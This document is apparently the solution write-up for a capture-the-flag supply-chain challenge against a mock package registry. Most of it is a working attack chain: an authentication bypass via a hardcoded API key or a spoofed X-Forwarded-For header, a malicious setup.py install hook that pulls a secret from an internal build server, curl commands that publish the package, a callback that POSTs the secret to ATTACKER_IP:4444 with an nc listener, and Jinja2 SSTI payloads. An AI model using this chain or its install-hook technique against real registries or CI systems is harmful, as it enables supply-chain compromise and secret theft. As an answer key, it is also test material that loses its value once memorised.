# Solution: Supply Chain Registry (web-oss-registry)

## Vulnerability Chain
1. **Unauthenticated package publish** via X-Forwarded-For bypass
2. **Malicious setup.py postinstall hook** executes as root in CI runner
3. **Code execution** inside ci-runner container → exfiltrate flag from build-server

## Step-by-Step Exploit

### Step 1: Bypass authentication on /api/publish

The registry's `/api/publish` endpoint checks:
```python
authed = (
    api_key == VALID_API_KEY      # prod key — unknown
    or api_key == "admin123"      # hardcoded fallback — the vulnerability
    or is_internal_request()      # X-Forwarded-For bypass
)
```

Two bypass methods:
- Use `X-API-Key: admin123` (hardcoded fallback)
- Or: `X-Forwarded-For: 10.0.0.1` (spoof internal IP)

### Step 2: Build malicious Python package

Create the malicious package locally:

```bash
mkdir -p /tmp/evil-pkg/evil_pkg
cat > /tmp/evil-pkg/evil_pkg/__init__.py << 'EOF'
# benign module
EOF

cat > /tmp/evil-pkg/setup.py << 'EOF'
from setuptools import setup
from setuptools.command.install import install
import subprocess, os

class PostInstall(install):
    def run(self):
        install.run(self)
        # Exfiltrate flag from build-server via registry HTTP
        import urllib.request, json
        try:
            # Read flag from build-server (accessible only if we're in ci-runner)
            import socket
            # Connect to build-server:9000/secrets/flag
            req = urllib.request.Request("http://build-server:9000/secrets/flag")
            resp = urllib.request.urlopen(req, timeout=5)
            data = json.loads(resp.read())
            flag = data.get("flag", "")
            # Exfil via DNS or HTTP callback (attacker-controlled server)
            # For CTF: write to a world-readable file in /tmp
            with open("/tmp/PWNED_FLAG.txt", "w") as f:
                f.write(flag)
        except Exception as e:
            with open("/tmp/PWNED_ERROR.txt", "w") as f:
                f.write(str(e))

setup(
    name="corp-utils",
    version="1.0.0",
    packages=["evil_pkg"],
    cmdclass={"install": PostInstall},
)
EOF

cd /tmp/evil-pkg
tar czf /tmp/corp-utils-1.0.0.tar.gz -C /tmp evil-pkg/
```

### Step 3: Upload the malicious package

```bash
# Method 1: hardcoded API key
curl -X POST http://<TARGET_IP>:8080/api/publish \
  -H "X-API-Key: admin123" \
  -F "package=@/tmp/corp-utils-1.0.0.tar.gz" \
  -F 'metadata={"name":"corp-utils","version":"1.0.0","description":"Utility lib","author":"dev"}'

# Method 2: X-Forwarded-For bypass
curl -X POST http://<TARGET_IP>:8080/api/publish \
  -H "X-Forwarded-For: 10.0.0.1" \
  -F "package=@/tmp/corp-utils-1.0.0.tar.gz" \
  -F 'metadata={"name":"corp-utils","version":"1.0.0","description":"Utility lib","author":"dev"}'
```

Expected response:
```json
{"status": "published", "package": "corp-utils", "version": "1.0.0", ...}
```

### Step 4: Wait for CI runner

The CI runner polls every 30 seconds. After ~30s it will:
1. See the new `corp-utils==1.0.0` package
2. Download and `pip install` it
3. `setup.py install` runs → `PostInstall.run()` executes
4. The hook reads the flag from `http://build-server:9000/secrets/flag`
5. Writes to `/tmp/PWNED_FLAG.txt` in the ci-runner container

### Step 5: Retrieve the flag

Since the hook runs inside the ci-runner container, you need a callback mechanism.
Modify the setup.py hook to POST to your attacker server:

```python
import urllib.request
urllib.request.urlopen(
    urllib.request.Request(
        "http://ATTACKER_IP:4444/flag",
        data=flag.encode(),
        method="POST"
    ),
    timeout=5
)
```

On your machine:
```bash
nc -lvnp 4444
```

## Alternative: SSTI via description field

The registry's web UI renders package descriptions with `| safe` (raw HTML).
You can inject HTML/script, but since it's server-side Jinja2:

```
description = "{{config}}"  # leaks Flask config
description = "{{''.__class__.__mro__[1].__subclasses__()}}"  # class enumeration
```

This gives SSTI → RCE directly on the registry container. The flag is on
build-server (internal), so combine with SSRF or pivot.

## Flags Location
- Flag file: `/app/secrets/flag.txt` on build-server container
- Readable via: `http://build-server:9000/secrets/flag` (internal network)
- Accessible from: ci-runner container via RCE through pip postinstall hook
